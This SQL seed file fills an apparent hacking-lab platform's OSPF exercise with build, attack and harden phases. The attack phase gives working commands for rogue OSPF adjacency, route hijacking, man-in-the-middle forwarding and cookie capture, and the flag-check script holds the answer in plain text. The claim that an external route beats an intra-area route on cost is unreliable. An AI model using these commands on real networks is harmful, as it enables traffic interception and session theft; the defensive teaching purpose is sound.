-- ═══════════════════════════════════════════════════════
-- Lab 04 (id=4) — OSPF Infiltration : full content (Vol 2 · Ch 8)
-- ═══════════════════════════════════════════════════════

UPDATE labs
SET short_desc = 'Build a 5-router OSPF network then inject rogue LSAs to poison the routing table.',
    topic = 'routing',
    difficulty = 'hard',
    book_ref = 'Vol 2 · Ch 8'
WHERE id = 4;

-- ─────────────────────────── BUILD ───────────────────────────
UPDATE lab_phases SET
  title = 'An OSPF domain that trusts everyone',
  is_pro_only = false,
  content = $md$
<div class="phase build">
    <div class="phase-head"><span class="phase-tag">Build</span><h3>An OSPF domain that trusts everyone</h3></div>
    <p class="goal">Two routers, one area, no authentication — the default state of most lab (and too many production) OSPF deployments. Establish the legitimate path first so you can watch it get hijacked.</p>

    <div class="step">
      <div class="step-label"><span class="n">1</span> OSPF on R1 and R2</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">R1(config)#</span> router ospf 1
<span class="prompt">R1(config-router)#</span> network 10.0.99.0 0.0.0.255 area 0    <span class="cmt"># transit</span>
<span class="prompt">R1(config-router)#</span> network 10.0.20.0 0.0.0.255 area 0    <span class="cmt"># server LAN</span>

<span class="prompt">R2(config)#</span> router ospf 1
<span class="prompt">R2(config-router)#</span> network 10.0.99.0 0.0.0.255 area 0
<span class="prompt">R2(config-router)#</span> network 10.0.10.0 0.0.0.255 area 0    <span class="cmt"># client LAN</span></pre>
    </div>

    <div class="step">
      <div class="step-label"><span class="n">2</span> Confirm the legitimate path</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">R2#</span> show ip ospf neighbor
<span class="cmt">Neighbor ID   State     Address       Interface
10.0.99.1     FULL/DR   10.0.99.1     Ethernet0/0   ← only R1, as it should be</span>

<span class="prompt">R2#</span> show ip route ospf | include 10.0.20.0
<span class="cmt">O   10.0.20.0/24 [110/20] via <b>10.0.99.1</b>, Ethernet0/0   ← next-hop = R1. Correct.</span></pre>
      <div class="note why"><strong>The number that gets hijacked:</strong> <code>[110/20]</code> — administrative distance 110, cost 20, via R1. Lower total cost wins. If you can advertise the same prefix at a lower cost, R2 switches to you. That's the entire attack.</div>
    </div>
  </div>
$md$
WHERE lab_id = 4 AND phase = 'build';

-- ─────────────────────────── ATTACK ───────────────────────────
UPDATE lab_phases SET
  title = 'Join uninvited, advertise a lie',
  is_pro_only = false,
  content = $md$
<div class="phase attack">
    <div class="phase-head"><span class="phase-tag">Attack</span><h3>Join uninvited, advertise a lie</h3></div>
    <p class="goal">Run a real OSPF stack on Kali (FRRouting). With no authentication on the segment, it forms adjacencies with R1 and R2, then advertises a route that redirects traffic through you. Two techniques — basic redistribution (works, but fragile) and more-specific-prefix injection (the reliable hijack that wins every time).</p>

    <div class="step">
      <div class="step-label"><span class="n">1</span> Bring up FRR's OSPF on Kali</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">kali$</span> sed -i 's/ospfd=no/ospfd=yes/' /etc/frr/daemons
<span class="prompt">kali$</span> systemctl restart frr
<span class="attackline">kali$ vtysh -c 'conf t' \
  -c 'router ospf' \
  -c 'network 10.0.99.0/24 area 0' \
  -c 'redistribute static' \
  -c 'end'</span></pre>
      <div class="note watch"><strong>Watch the routers accept you:</strong> within a couple of hellos, R1 and R2 list Kali as a neighbor — no credential was ever requested.</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">R2#</span> show ip ospf neighbor
<span class="cmt">10.0.99.1    FULL/DR     10.0.99.1    Ethernet0/0
10.0.99.66   FULL/DROTHER 10.0.99.66  Ethernet0/0   ← that's Kali. You're in.</span></pre>
    </div>

    <div class="step">
      <div class="step-label"><span class="n">2</span> Basic redistribution — advertise the server subnet at low cost</div>
      <p>Inject <code>10.0.20.0/24</code> as a static route and let OSPF redistribute it with a low metric. R2 sees your E1 route with cost 2 (metric 1 + hop to Kali), versus R1's path at cost 20 — your route wins on cost.</p>
      <pre><button class="copy-btn">copy</button><span class="attackline">kali$ ip route add 10.0.20.0/24 dev eth0
kali$ vtysh -c 'conf t' -c 'router ospf' \
  -c 'redistribute static metric 1 metric-type 1' -c 'end'</span>

<span class="prompt">R2#</span> show ip route ospf | include 10.0.20.0
<span class="cmt">O E1  10.0.20.0/24 [110/2] via <b>10.0.99.66</b>, Ethernet0/0   ← next-hop is now KALI</span></pre>
      <div class="note trap"><strong>This works — until it doesn't.</strong> If R1's link cost changes, if routes flap, or if someone tweaks an interface bandwidth, the metric advantage evaporates and traffic silently falls back to R1. Cost-based hijack is a gamble.</div>
    </div>

    <div class="step">
      <div class="step-label"><span class="n">3</span> The reliable hijack — more-specific prefix beats longest-match</div>
      <p>Instead of fighting a cost battle for the entire /24, advertise a <strong>narrower prefix</strong> — say <code>10.0.20.0/25</code> or even a single server <code>10.0.20.10/32</code>. OSPF's route-selection algorithm evaluates longest-prefix-match <em>before</em> cost: a /25 or /32 always wins against a /24, regardless of metric. You don't need to beat R1's cost — you sidestep the comparison entirely.</p>
      <pre><button class="copy-btn">copy</button><span class="attackline">kali$ ip route del 10.0.20.0/24 dev eth0
kali$ ip route add 10.0.20.10/32 dev eth0   # just the server, surgical
kali$ vtysh -c 'conf t' -c 'router ospf' \
  -c 'redistribute static metric 1' -c 'end'</span>

<span class="prompt">R2#</span> show ip route 10.0.20.10
<span class="cmt">Routing entry for 10.0.20.10/32
  Known via "ospf 1", distance 110, metric 2, type extern 1
  * 10.0.99.66, via Ethernet0/0    ← next-hop is KALI for /32
  Routing entry for 10.0.20.0/24   ← R1's /24 still exists but is
  Known via "ospf 1", distance 110, metric 20, via 10.0.99.1    never consulted for .10</span></pre>
      <div class="note why"><strong>Longest-prefix-match is absolute.</strong> A more-specific route in the RIB always wins — cost, distance, metric type, none of it matters. R1's /24 route is still present but it's only used for addresses your /32 doesn't cover. You've carved out exactly the server you want without touching the rest of the subnet.</div>
    </div>

    <div class="step">
      <div class="step-label"><span class="n">4</span> Forward, capture, and lift the flag</div>
      <p>Turn Kali into a router so client→server traffic passes through and onward (invisible MITM), then read the cleartext session off the wire:</p>
      <pre><button class="copy-btn">copy</button><span class="prompt">kali$</span> sysctl -w net.ipv4.ip_forward=1
<span class="prompt">kali$</span> tshark -i eth0 -f "host 10.0.20.10" -Y 'http.cookie' -T fields -e http.cookie
<span class="cmt">SESSION=NB4-r0gu3-lsa-8d3e</span></pre>
    </div>

    <div class="flag">
      <div class="flag-label">🚩 Flag</div>
      <h4>Capture the token from client→server traffic you rerouted through Kali.</h4>
      <div class="flag-row">
        <input id="flag-in" placeholder="NB4-...">
        <button onclick="checkFlag()">Submit</button>
      </div>
      <div class="flag-msg" id="flag-msg"></div>
    </div>

    <details class="hint"><summary>Hint 1 — neighbor stuck in EXSTART/EXCHANGE, never reaches FULL</summary>
      <p>Classic OSPF MTU mismatch. Adjacency negotiation compares interface MTU; if FRR's <code>eth0</code> MTU differs from the Cisco interface, they hang in EXSTART. Either match the MTUs, or set <code>ip ospf mtu-ignore</code> on the router interface for the lab. Also confirm area number, hello/dead timers, and the transit subnet mask all match — any mismatch and the adjacency silently never forms.</p>
    </details>
    <details class="hint"><summary>Hint 2 — I'm a neighbor but R2 still routes via R1</summary>
      <p>Two possible causes. (1) Your redistributed route doesn't beat R1's path on cost: try <code>metric 1 metric-type 1</code> for a lower total. (2) More likely: R1 advertised the same prefix you did, but with a better (lower) cost from R2's perspective. The fix that <em>always</em> works: use a more-specific prefix. If R1 advertises /24, your /25 or /32 wins via longest-prefix-match — cost is irrelevant. That's Step 3, and it's the answer worth remembering.</p>
    </details>
  </div>
$md$
WHERE lab_id = 4 AND phase = 'attack';

-- ─────────────────────────── HARDEN ───────────────────────────
UPDATE lab_phases SET
  title = 'Make routers prove who they are',
  is_pro_only = false,
  content = $md$
<div class="phase harden">
    <div class="phase-head"><span class="phase-tag">Harden</span><h3>Make routers prove who they are</h3></div>
    <p class="goal">Two layers: authentication so no unauthenticated speaker can form an adjacency at all, and passive-interface so OSPF isn't even offered on segments where no legitimate neighbor lives.</p>

    <div class="step">
      <div class="step-label"><span class="n">1</span> Authenticate the transit adjacency (MD5)</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">R1(config)#</span> interface e0/0
<span class="prompt">R1(config-if)#</span> ip ospf authentication message-digest
<span class="prompt">R1(config-if)#</span> ip ospf message-digest-key 1 md5 NB-0spf-k3y

<span class="cmt"># identical key on R2's transit interface</span>
<span class="prompt">R2(config)#</span> interface e0/0
<span class="prompt">R2(config-if)#</span> ip ospf authentication message-digest
<span class="prompt">R2(config-if)#</span> ip ospf message-digest-key 1 md5 NB-0spf-k3y</pre>
      <div class="note why"><strong>Why this stops it cold:</strong> R1 and R2 now discard any OSPF packet lacking the correct MD5 digest. Kali doesn't have the key, so its hellos are dropped before an adjacency can even begin — the attack fails at step one, not step two.</div>
    </div>

    <div class="step">
      <div class="step-label"><span class="n">2</span> Passive-interface on the LAN edges</div>
      <p>Defense in depth: OSPF should never be spoken toward end hosts. Make LAN interfaces advertise their subnet but never send/accept hellos there:</p>
      <pre><button class="copy-btn">copy</button><span class="prompt">R1(config)#</span> router ospf 1
<span class="prompt">R1(config-router)#</span> passive-interface default
<span class="prompt">R1(config-router)#</span> no passive-interface e0/0    <span class="cmt"># transit stays active</span></pre>
      <div class="note trap"><strong>Order matters:</strong> <code>passive-interface default</code> makes <em>every</em> interface passive, then you re-enable only the real neighbor links. Forget the <code>no passive-interface</code> on the transit and you break the legitimate R1↔R2 adjacency too — a self-inflicted outage that looks exactly like the attack you were preventing.</div>
    </div>

    <div class="step">
      <div class="step-label"><span class="n">3</span> Re-attack — Kali can't get in</div>
      <pre><button class="copy-btn">copy</button><span class="attackline">kali$ systemctl restart frr</span>   <span class="cmt"># try to rejoin</span>

<span class="prompt">R2#</span> show ip ospf neighbor
<span class="cmt">10.0.99.1    FULL/DR    10.0.99.1    Ethernet0/0    ← only R1. Kali is gone.</span>

<span class="prompt">R2#</span> show ip route ospf | include 10.0.20.0
<span class="cmt">O   10.0.20.0/24 [110/20] via 10.0.99.1   ← restored. The lie never landed.</span></pre>
      <div class="note why"><strong>Prove the negative:</strong> re-run the FRR attack with auth on and watch <code>debug ip ospf adj</code> on R1 — you'll see it log a mismatched-authentication drop each time Kali tries. Seeing the attack fail <em>and knowing why</em> is the objective, not just the clean neighbor table.</div>
    </div>
  </div>

  <div class="cheatsheet">
    <h3>Command reference</h3>
    <div class="cs-grid">
      <div class="cs-row"><span class="k">show ip ospf neighbor</span><span class="v">Who's adjacent — the attacker appears and disappears here</span></div>
      <div class="cs-row"><span class="k">show ip route ospf</span><span class="v">The hijacked next-hop; watch it flip to Kali and back</span></div>
      <div class="cs-row"><span class="k">vtysh · redistribute static</span><span class="v">How FRR injects the bogus prefix into the area</span></div>
      <div class="cs-row"><span class="k">ip ospf authentication message-digest</span><span class="v">The fix — no key, no adjacency</span></div>
      <div class="cs-row"><span class="k">passive-interface default</span><span class="v">Stops OSPF being offered on host-facing links</span></div>
      <div class="cs-row"><span class="k">ip ospf mtu-ignore</span><span class="v">Bench aid if adjacency hangs in EXSTART</span></div>
    </div>
  </div>

  <details class="hint"><summary>Exam note — what CCNA actually tests here</summary>
    <p>200-301 wants OSPF neighbor states and what blocks adjacency (mismatched area, subnet, timers, authentication, MTU), the role of OSPF authentication, and <code>passive-interface</code> as both a stability and security control. It won't ask you to run FRR — but having watched an unauthenticated area get hijacked is why "enable OSPF authentication" will never read as an optional checkbox to you.</p>
  </details>

  <div class="foot">
    NetBreaker · Lab 04 · Build → Attack → Harden<br>
    Run only against your own GNS3 topology.
  </div>
</div>

<script>
  function checkFlag(){
    var v = (document.getElementById('flag-in').value||'').trim().replace(/^SESSION=/i,'');
    var msg = document.getElementById('flag-msg');
    if(/^NB4-r0gu3-lsa-8d3e$/i.test(v)){
      msg.textContent = '✓ Adjacency formed, route injected, traffic rerouted. +200 XP — the routers trusted a stranger.';
      msg.className = 'flag-msg ok';
      document.getElementById('xp').textContent = '200 / 300 XP';
    } else {
      msg.textContent = '✗ Not it. Confirm R2 shows next-hop 10.0.99.66, forward through Kali, then follow the client→server stream.';
      msg.className = 'flag-msg no';
    }
  }
  document.querySelectorAll('.copy-btn').forEach(function(b){
    b.addEventListener('click', function(){
      var text = b.parentElement.innerText.replace(/^copy\s*/, '');
      navigator.clipboard && navigator.clipboard.writeText(text);
      var o=b.textContent; b.textContent='copied'; setTimeout(function(){b.textContent=o;},1200);
    });
  });
  document.getElementById('flag-in').addEventListener('keydown',function(e){ if(e.key==='Enter') checkFlag(); });
</script>
</body>
</html>
$md$
WHERE lab_id = 4 AND phase = 'harden';

-- ─────────────────────────── TOPOLOGY ───────────────────────────
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (
  4,
  $svg$<svg viewBox="0 0 720 340" role="img" aria-label="Topology: R1 fronting a server subnet and R2 fronting a client subnet, joined on an OSPF transit segment through SW1, with a Kali attacker also on the transit segment">
      <!-- server subnet -->
      <rect x="40" y="26" width="150" height="46" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="115" y="46" text-anchor="middle" font-family="monospace" font-size="12" font-weight="700" fill="#0f172a">SERVER LAN</text>
      <text x="115" y="62" text-anchor="middle" font-family="monospace" font-size="10" fill="#64748b">10.0.20.0/24</text>

      <!-- R1 -->
      <rect x="55" y="120" width="120" height="46" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="115" y="140" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">R1</text>
      <text x="115" y="156" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">.1 on transit</text>
      <line x1="115" y1="72" x2="115" y2="120" stroke="#2563eb" stroke-width="2"/>

      <!-- SW1 transit -->
      <rect x="300" y="120" width="130" height="46" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="365" y="140" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#2563eb">SW1</text>
      <text x="365" y="156" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">transit · 10.0.99.0/24</text>

      <!-- R2 -->
      <rect x="545" y="120" width="120" height="46" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="605" y="140" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">R2</text>
      <text x="605" y="156" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">.2 on transit</text>

      <!-- client subnet -->
      <rect x="530" y="26" width="150" height="46" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="605" y="46" text-anchor="middle" font-family="monospace" font-size="12" font-weight="700" fill="#0f172a">CLIENT LAN</text>
      <text x="605" y="62" text-anchor="middle" font-family="monospace" font-size="10" fill="#64748b">10.0.10.0/24</text>
      <line x1="605" y1="72" x2="605" y2="120" stroke="#2563eb" stroke-width="2"/>

      <!-- transit links -->
      <line x1="175" y1="143" x2="300" y2="143" stroke="#2563eb" stroke-width="2"/>
      <line x1="430" y1="143" x2="545" y2="143" stroke="#2563eb" stroke-width="2"/>
      <text x="237" y="135" text-anchor="middle" font-family="monospace" font-size="9" fill="#16a34a">OSPF area 0</text>
      <text x="487" y="135" text-anchor="middle" font-family="monospace" font-size="9" fill="#16a34a">OSPF area 0</text>

      <!-- Kali on transit -->
      <line x1="365" y1="166" x2="365" y2="250" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 4"/>
      <rect x="305" y="250" width="120" height="56" rx="8" fill="#fef2f2" stroke="#e5484d" stroke-width="1.5"/>
      <text x="365" y="272" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#e5484d">KALI</text>
      <text x="365" y="288" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#e5484d">.66 · rogue OSPF</text>

      <text x="365" y="326" text-anchor="middle" font-family="monospace" font-size="10" fill="#94a3b8">on the transit segment, an unauthenticated router is just another neighbor</text>
    </svg>$svg$,
  $svg$<svg viewBox="0 0 720 340" role="img" aria-label="Topology: R1 fronting a server subnet and R2 fronting a client subnet, joined on an OSPF transit segment through SW1, with a Kali attacker also on the transit segment">
      <!-- server subnet -->
      <rect x="40" y="26" width="150" height="46" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="115" y="46" text-anchor="middle" font-family="monospace" font-size="12" font-weight="700" fill="#0f172a">SERVER LAN</text>
      <text x="115" y="62" text-anchor="middle" font-family="monospace" font-size="10" fill="#64748b">10.0.20.0/24</text>

      <!-- R1 -->
      <rect x="55" y="120" width="120" height="46" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="115" y="140" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">R1</text>
      <text x="115" y="156" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">.1 on transit</text>
      <line x1="115" y1="72" x2="115" y2="120" stroke="#2563eb" stroke-width="2"/>

      <!-- SW1 transit -->
      <rect x="300" y="120" width="130" height="46" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="365" y="140" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#2563eb">SW1</text>
      <text x="365" y="156" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">transit · 10.0.99.0/24</text>

      <!-- R2 -->
      <rect x="545" y="120" width="120" height="46" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="605" y="140" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">R2</text>
      <text x="605" y="156" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">.2 on transit</text>

      <!-- client subnet -->
      <rect x="530" y="26" width="150" height="46" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="605" y="46" text-anchor="middle" font-family="monospace" font-size="12" font-weight="700" fill="#0f172a">CLIENT LAN</text>
      <text x="605" y="62" text-anchor="middle" font-family="monospace" font-size="10" fill="#64748b">10.0.10.0/24</text>
      <line x1="605" y1="72" x2="605" y2="120" stroke="#2563eb" stroke-width="2"/>

      <!-- transit links -->
      <line x1="175" y1="143" x2="300" y2="143" stroke="#2563eb" stroke-width="2"/>
      <line x1="430" y1="143" x2="545" y2="143" stroke="#2563eb" stroke-width="2"/>
      <text x="237" y="135" text-anchor="middle" font-family="monospace" font-size="9" fill="#16a34a">OSPF area 0</text>
      <text x="487" y="135" text-anchor="middle" font-family="monospace" font-size="9" fill="#16a34a">OSPF area 0</text>

      <!-- Kali on transit -->
      <line x1="365" y1="166" x2="365" y2="250" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 4"/>
      <rect x="305" y="250" width="120" height="56" rx="8" fill="#fef2f2" stroke="#e5484d" stroke-width="1.5"/>
      <text x="365" y="272" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#e5484d">KALI</text>
      <text x="365" y="288" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#e5484d">.66 · rogue OSPF</text>

      <text x="365" y="326" text-anchor="middle" font-family="monospace" font-size="10" fill="#94a3b8">on the transit segment, an unauthenticated router is just another neighbor</text>
    </svg>$svg$,
  '[]'::jsonb
)
ON CONFLICT (lab_id) DO UPDATE SET
  svg_small = EXCLUDED.svg_small,
  svg_large = EXCLUDED.svg_large,
  legend    = EXCLUDED.legend;
